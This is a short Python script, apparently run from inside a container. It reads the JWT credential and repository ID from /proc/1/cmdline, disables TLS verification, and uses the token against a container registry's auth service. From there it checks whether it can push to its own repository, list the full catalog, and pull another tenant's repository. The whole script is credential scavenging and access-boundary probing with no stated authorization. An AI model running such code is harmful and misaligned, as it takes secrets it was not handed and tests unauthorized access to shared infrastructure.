import re,urllib.request as u,urllib.error,ssl,json,base64,urllib.parse
ctx=ssl._create_unverified_context()
cmd=open('/proc/1/cmdline','rb').read().decode('utf-8','replace')
m=re.search(r'eyJ[A-Za-z0-9_.-]{100,}',cmd); tok=m.group(0) if m else ''
# my repo id from cmdline
myd=re.search(r'user-registry\.amer-1\.aivencloud\.net/([0-9a-f-]+):',cmd); myrepo=myd.group(1) if myd else '?'
print('jwt_len',len(tok),'my_repo',myrepo)
basic=base64.b64encode(('jwt/nomad-token:'+tok).encode()).decode()
def get(url,hdr=None):
    r=u.Request(url,headers=hdr or {})
    try:
        x=u.urlopen(r,context=ctx,timeout=10); return x.status,dict(x.headers),x.read(3000)
    except urllib.error.HTTPError as e: return e.code,dict(e.headers),e.read(600)
    except Exception as e: return -1,{},str(e).encode()
def bearer(reg,realm,svc,scope):
    url=realm+'?service=%s&scope=%s'%(svc,urllib.parse.quote(scope))
    st,h,b=get(url,{'Authorization':'Basic '+basic})
    try:
        d=json.loads(b); return d.get('token') or d.get('access_token'), st, b[:120]
    except Exception: return None,st,b[:120]
reg='user-registry.amer-1.aivencloud.net'
st,h,_=get('https://%s/v2/'%reg)
wa=h.get('Www-Authenticate','')
realm=re.search(r'realm="([^"]+)"',wa).group(1); svc=re.search(r'service="([^"]+)"',wa).group(1)
# tests
tests=[
 ('own repo pull', 'repository:%s:pull'%myrepo, 'https://%s/v2/%s/tags/list'%(reg,myrepo)),
 ('own repo push', 'repository:%s:push'%myrepo, 'https://%s/v2/%s/tags/list'%(reg,myrepo)),
 ('catalog', 'registry:catalog:*', 'https://%s/v2/_catalog'%reg),
 ('FOREIGN repo pull (guess)', 'repository:00000000-0000-0000-0000-000000000000:pull', 'https://%s/v2/00000000-0000-0000-0000-000000000000/tags/list'%reg),
]
for name,scope,url in tests:
    t,st,rb=bearer(reg,realm,svc,scope)
    print('--',name,'token_st',st,'granted',bool(t),'resp',rb[:100])
    if t:
        st2,h2,b2=get(url,{'Authorization':'Bearer '+t})
        print('    ',url.split('/')[-1],'->',st2,b2[:200])
